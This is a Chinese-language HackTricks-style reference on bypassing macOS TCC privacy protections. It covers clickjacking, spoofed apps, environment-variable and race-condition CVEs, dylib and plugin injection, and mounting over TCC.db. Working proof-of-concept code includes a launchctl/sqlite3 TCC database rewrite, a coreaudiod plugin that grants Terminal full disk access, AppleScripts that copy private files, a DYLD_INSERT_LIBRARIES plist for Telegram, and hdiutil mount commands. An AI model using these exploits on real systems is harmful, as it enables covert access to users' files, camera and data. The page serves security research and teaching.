# macOS TCC 绕过

{{#include ../../../../../banners/hacktricks-training.md}}

## 按功能分类

### 写入绕过

这并不是绕过，只是 TCC 的工作方式：**它不会防止写入**。如果 Terminal **没有权限读取用户的 Desktop，它仍然可以写入其中**：
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
新的**文件**会被添加扩展属性 **`com.apple.macl`**，以授予 **creators app** 读取它的权限。

### TCC ClickJacking

可以在 **TCC 提示窗口上方放置另一个窗口**，诱使用户在未察觉的情况下**接受**该提示。你可以在 [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** 中找到 PoC。**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### 通过任意名称发起 TCC 请求

攻击者可以在 **`Info.plist`** 中使用任意名称（例如 Finder、Google Chrome 等）**创建应用**，并使其请求访问某些受 TCC 保护的位置。用户会以为是合法应用在请求该访问权限。\
此外，还可以**从 Dock 中移除合法应用并将伪造应用放入其中**。这样，当用户点击伪造应用时（伪造应用可以使用相同的图标），它就可以调用合法应用、请求 TCC 权限并执行 malware，使用户相信是合法应用请求了该访问权限。

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

更多信息和 PoC：


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

默认情况下，通过 **SSH 进行的访问曾经拥有“Full Disk Access”**。要禁用此权限，需要将其列出但禁用（从列表中移除并不会移除这些权限）：

![TCC Request by arbitrary name - SSH Bypass: 默认情况下，通过 SSH 进行的访问曾经拥有“Full Disk Access”。要禁用此权限，需要将其列出但禁用（从列表中移除并不会移除这些权限）](<../../../../../images/image (1077).png>)

下面是一些 **malwares 成功绕过此保护机制**的示例：

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> 注意，现在要启用 SSH，必须拥有 **Full Disk Access**

### Handle extensions - CVE-2022-26767

属性 **`com.apple.macl`** 会被赋予文件，以授予**某个应用读取该文件的权限。** 当用户将文件**拖放**到应用上，或**双击**文件并使用**默认应用**打开时，系统会设置此属性。

因此，用户可以**注册一个 malicious app** 来处理所有扩展名，并调用 Launch Services **打开**任意文件（这样 malicious file 就会被授予读取该文件的权限）。

### iCloud

通过 entitlement **`com.apple.private.icloud-account-access`**，可以与 **`com.apple.iCloudHelper`** XPC service 通信，该服务会**提供 iCloud tokens**。

**iMovie** 和 **Garageband** 拥有此 entitlement 以及其他允许相关操作的 entitlement。

有关利用该 entitlement **获取 iCloud tokens** 的 exploit 的更多**信息**，请查看演讲：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

拥有 **`kTCCServiceAppleEvents`** 权限的应用可以**控制其他应用**。这意味着它可能能够**滥用其他应用获得的权限**。

有关 Apple Scripts 的更多信息，请参阅：


{{#ref}}
macos-apple-scripts.md
{{#endref}}

例如，如果某个应用拥有针对 **`iTerm`** 的 **Automation 权限**，在此示例中，**`Terminal`** 就可以访问 iTerm：

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### 通过 iTerm

没有 FDA 的 Terminal 可以调用拥有 FDA 的 iTerm，并利用它执行操作：
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### 通过 Finder

或者，如果某个 App 通过 Finder 具有访问权限，它可以执行类似这样的脚本：
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## 按 App 行为

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

用户态 **tccd daemon** 使用 **`HOME`** **env** 变量从以下位置访问 TCC 用户数据库：**`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

根据 [this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)，并且由于 TCC daemon 通过当前用户域中的 **`launchd`** 运行，因此可以 **控制传递给它的所有环境变量**。\
因此，**攻击者可以在 `launchctl` 中设置 `$HOME` environment** 变量，使其指向一个由攻击者 **控制的** **目录**，然后 **重启** **TCC** daemon，接着 **直接修改 TCC 数据库**，从而在完全不提示终端用户的情况下，为自身授予 **所有可用的 TCC entitlement**。\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes 可以访问受 TCC 保护的位置，但创建 note 时，note 会被**创建在非受保护的位置**。因此，你可以让 Notes 将受保护的文件复制到一个 note 中（也就是复制到非受保护的位置），然后访问该文件：

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

二进制文件 `/usr/libexec/lsd` 及其 library `libsecurity_translocate` 具有 entitlement `com.apple.private.nullfs_allow`，允许其创建 **nullfs** mount；同时还具有 entitlement `com.apple.private.tcc.allow` 和 **`kTCCServiceSystemPolicyAllFiles`**，因此可以访问所有文件。

可以向 "Library" 添加 quarantine 属性，调用 **`com.apple.security.translocation`** XPC service。随后，它会将 Library 映射到 **`$TMPDIR/AppTranslocation/d/d/Library`**，从而可以**访问** Library 中的所有文档。

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** 具有一个有趣的功能：运行时，它会将被放入 **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** 的文件**导入**用户的 "media library"。此外，它会调用类似以下的代码：**`rename(a, b);`**，其中 `a` 和 `b` 是：

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

这个 **`rename(a, b);`** 行为容易受到 **Race Condition** 影响，因为可以在 `Automatically Add to Music.localized` 文件夹中放置一个伪造的 **TCC.db** 文件，然后在创建新文件夹 (b) 来复制文件时，删除该文件，并将其指向 **`~/Library/Application Support/com.apple.TCC`**/。
**更多信息**请参阅[**writeup**](https://gergelykalman.com/CVE-2023-38571-a-macOS-TCC-bypass-in-Music-and-TV.html)

### SQLITE_SQLLOG_DIR - CVE-2023-32422

如果设置 **`SQLITE_SQLLOG_DIR="path/folder"`**，基本上意味着**任何打开的 db 都会被复制到该路径**。在这个 CVE 中，该控制项被滥用来向一个 **SQLite database** 中进行**写入**；该 database 将由拥有 FDA 的进程打开，并且该进程使用 TCC database。随后，通过在文件名中使用 **symlink** 滥用 **`SQLITE_SQLLOG_DIR`**，这样当该 database 被**打开**时，用户的 **TCC.db 会被打开的 database 覆盖**。\
**更多信息**请参阅[**writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html)**以及**[ **talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s)。

### **SQLITE_AUTO_TRACE**

如果设置环境变量 **`SQLITE_AUTO_TRACE`**，library **`libsqlite3.dylib`** 将开始**记录**所有 SQL queries。许多应用程序使用了该 library，因此可以记录它们的所有 SQLite queries。

一些 Apple 应用程序使用该 library 访问受 TCC 保护的信息。
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

这个 **env variable 由 `Metal` framework 使用**，它是多个程序的 dependency，最值得注意的是拥有 FDA 的 `Music`。

设置如下：`MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`。如果 `path` 是有效 directory，就会触发 bug，我们可以使用 `fs_usage` 查看程序中发生了什么：

- 一个名为 `path/.dat.nosyncXXXX.XXXXXX` 的文件会被 `open()`（X 是随机字符）
- 一个或多个 `write()` 会将内容写入该文件（我们无法控制这些内容）
- `path/.dat.nosyncXXXX.XXXXXX` 会被 `rename()` 为 `path/name`

这是一次临时文件写入，随后执行一个**不安全的 `rename(old, new)`**。

之所以不安全，是因为它必须**分别解析 old 和 new 路径**，这需要一定时间，并且可能容易受到 Race Condition 攻击。更多信息可以查看 `xnu` 的 `renameat_internal()` 函数。

> [!CAUTION]
> 基本上，如果一个 privileged process 正在从你控制的 folder 执行 rename，你就可能赢得一场 RCE，并使其访问其他文件；或者像这个 CVE 中一样，打开 privileged app 创建的文件并保存一个 FD。
>
> 如果 rename 访问的是你控制的 folder，同时你已经修改了 source file 或持有它的 FD，那么你可以将 destination file（或 folder）修改为指向一个 symlink，从而随时写入。

这就是该 CVE 中使用的 attack：例如，要覆盖用户的 `TCC.db`，我们可以：

- 创建 `/Users/hacker/ourlink`，使其指向 `/Users/hacker/Library/Application Support/com.apple.TCC/`
- 创建 directory `/Users/hacker/tmp/`
- 设置 `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- 使用此 env var 运行 `Music`，触发 bug
- 捕获对 `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` 的 `open()`（X 是随机字符）
- 在这里，我们还会以写入模式 `open()` 此文件，并保留该 file descriptor
- **循环执行** `/Users/hacker/tmp` 与 `/Users/hacker/ourlink` 的 atomic switch
- 这样做是为了最大化成功机会，因为 race window 非常短，但输掉 race 的 downside 可以忽略不计
- 等待一段时间
- 测试是否成功
- 如果没有成功，则从头再次运行

更多信息请参阅 [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> 现在，如果你尝试使用 env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE`，apps 将无法启动

### Apple Remote Desktop

作为 root，你可以启用此 service，并且 **ARD agent 将拥有 full disk access**，之后 user 可以滥用它，使其复制一个新的 **TCC user database**。

## By **NFSHomeDirectory**

TCC 使用用户 HOME folder 中的 database 控制对用户专属资源的访问，位置为 **$HOME/Library/Application Support/com.apple.TCC/TCC.db**。\
因此，如果 user 能够使用指向**不同 folder** 的 $HOME env variable 重启 TCC，那么该 user 就可以在 **/Library/Application Support/com.apple.TCC/TCC.db** 中创建新的 TCC database，并诱使 TCC 向任意 app 授予任意 TCC permission。

> [!TIP]
> 注意，Apple 使用用户 profile 中 **`NFSHomeDirectory`** attribute 保存的 setting 作为 **`$HOME` 的 value**。因此，如果你 compromise 了一个拥有修改此 value 权限（**`kTCCServiceSystemPolicySysAdminFiles`**）的 application，就可以通过 TCC bypass **weaponize** 此 option。

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**第一个 POC** 使用 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) 和 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) 修改 user 的 **HOME** folder。

1. 获取 target app 的 _csreq_ blob。
2. 放置一个具有所需 access 和 _csreq_ blob 的 fake _TCC.db_ 文件。
3. 使用 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) export user 的 Directory Services entry。
4. 修改 Directory Services entry，以更改 user 的 home directory。
5. 使用 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) import 修改后的 Directory Services entry。
6. 停止 user 的 _tccd_ 并 reboot process。

第二个 POC 使用了 **`/usr/libexec/configd`**，它具有值为 `kTCCServiceSystemPolicySysAdminFiles` 的 `com.apple.private.tcc.allow`。\
可以使用 **`-t`** option 运行 **`configd`**，attacker 可以指定要 **load 的 custom Bundle**。因此，该 exploit 使用 **`configd` code injection** 替换了通过 **`dsexport`** 和 **`dsimport`** 更改 user home directory 的 method。

更多信息请查看 [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)。

## By process injection

有多种技术可以向 process 内部注入 code，并滥用其 TCC privileges：


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

此外，发现的最常见 TCC bypass process injection 是通过 **plugins (load library)** 实现的。\
Plugins 是通常以 libraries 或 plist 形式存在的额外 code，它们会被 **main application load**，并在其 context 下执行。因此，如果 main application 能够访问 TCC restricted files（通过已授予的 permissions 或 entitlements），那么 **custom code 也将拥有这些权限**。

### CVE-2020-27937 - Directory Utility

application `/System/Library/CoreServices/Applications/Directory Utility.app` 具有 entitlement **`kTCCServiceSystemPolicySysAdminFiles`**，会 load 扩展名为 **`.daplug`** 的 plugins，并且**没有 hardened** runtime。

为了 weaponize 此 CVE，需要（滥用前述 entitlement）**更改 `NFSHomeDirectory`**，从而能够**接管 user 的 TCC databas**e，以 bypass TCC。

更多信息请查看 [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)。

### CVE-2020-29621 - Coreaudiod

binary **`/usr/sbin/coreaudiod`** 具有 entitlements `com.apple.security.cs.disable-library-validation` 和 `com.apple.private.tcc.manager`。前者**允许 code injection**，后者使其能够**manage TCC**。

该 binary 允许从 folder `/Library/Audio/Plug-Ins/HAL` load **third party plug-ins**。因此，可以使用以下 PoC **load 一个 plugin 并滥用 TCC permissions**：
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
更多信息请查看[**原始报告**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)。

### Device Abstraction Layer (DAL) Plug-Ins

通过 Core Media I/O 打开 camera stream 的系统应用（具有 **`kTCCServiceCamera`** 的应用）会在进程中加载位于 `/Library/CoreMediaIO/Plug-Ins/DAL` 的这些 plugins（不受 SIP 限制）。

只需将一个带有通用 **constructor** 的 library 存放在其中，即可实现**代码注入**。

多个 Apple 应用都存在此漏洞。

### Firefox

Firefox 应用具有 `com.apple.security.cs.disable-library-validation` 和 `com.apple.security.cs.allow-dyld-environment-variables` entitlements：
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
有关如何轻松利用此漏洞的更多信息，请查看[**原始报告**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。

### CVE-2020-10006

二进制文件 `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` 具有 **`com.apple.private.tcc.allow`** 和 **`com.apple.security.get-task-allow`** 这两个 entitlements，因此可以向进程内部注入代码并使用 TCC 权限。

### CVE-2023-26818 - Telegram

Telegram 具有 **`com.apple.security.cs.allow-dyld-environment-variables`** 和 **`com.apple.security.cs.disable-library-validation`** 这两个 entitlements，因此可以滥用它来**获取其权限**，例如使用摄像头进行录制。你可以在[**writeup 中找到 payload**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。

注意，为了使用环境变量加载 library，创建了一个**自定义 plist** 来注入该 library，并使用 **`launchctl`** 启动它：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## 通过 open 调用

即使处于 sandboxed 状态，也可以调用 **`open`**

### Terminal 脚本

为 Terminal 授予 **Full Disk Access (FDA)** 很常见，至少在技术人员使用的计算机上是如此。也可以借助它调用 **`.terminal`** 脚本。

**`.terminal`** 脚本是 plist 文件，例如以下文件，其中要执行的命令位于 **`CommandString`** 键中：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
应用程序可以在诸如 /tmp 的位置写入一个终端脚本，并使用类似以下命令启动它：
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**任何用户**（即使是非特权用户）都可以创建并挂载一个 time machine snapshot，并**访问该 snapshot 中的所有文件**。\
唯一需要的**特权**是所使用的应用程序（例如 `Terminal`）必须拥有 **Full Disk Access**（FDA）权限（`kTCCServiceSystemPolicyAllfiles`），且该权限需要由管理员授予。
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
更详细的说明可以[**在原始报告中找到**](https://theevilbit.github.io/posts/cve_2020_9771/)**。**

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

即使 TCC DB file 受到保护，也可以**在该目录上 mount** 一个新的 TCC.db file：
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
查看 [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/) 中的 **full exploit**。

### CVE-2024-40855

正如 [original writeup](https://www.kandji.io/blog/macos-audit-story-part2) 中所述，此 CVE 利用了 `diskarbitrationd`。

公共 `DiskArbitration` framework 中的 `DADiskMountWithArgumentsCommon` 函数执行了安全检查。然而，可以通过直接调用 `diskarbitrationd` 来绕过该检查，从而在路径中使用 `../` 元素和 symlink。

由于 `diskarbitrationd` 具有 `com.apple.private.security.storage-exempt.heritable` entitlement，攻击者可以在任意位置执行任意 mount，包括覆盖 TCC database。

### asr

工具 **`/usr/sbin/asr`** 可以复制整个磁盘，并将其 mount 到其他位置，从而绕过 TCC protections。

### Location Services

还有第三个 TCC database：**`/var/db/locationd/clients.plist`**，用于标识获准 **access location services** 的客户端。\
文件夹 **`/var/db/locationd/` 未受到 DMG mounting 的保护**，因此可以 mount 我们自己的 plist。

## 通过 startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## 通过 grep

在多种情况下，文件会将 emails、phone numbers、messages... 等敏感信息存储在未受保护的位置（这在 Apple 中会被视为 vulnerability）。

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

这现在已经不再有效，但它[**过去确实有效**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**：**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

另一种使用 [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) 的方式：

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
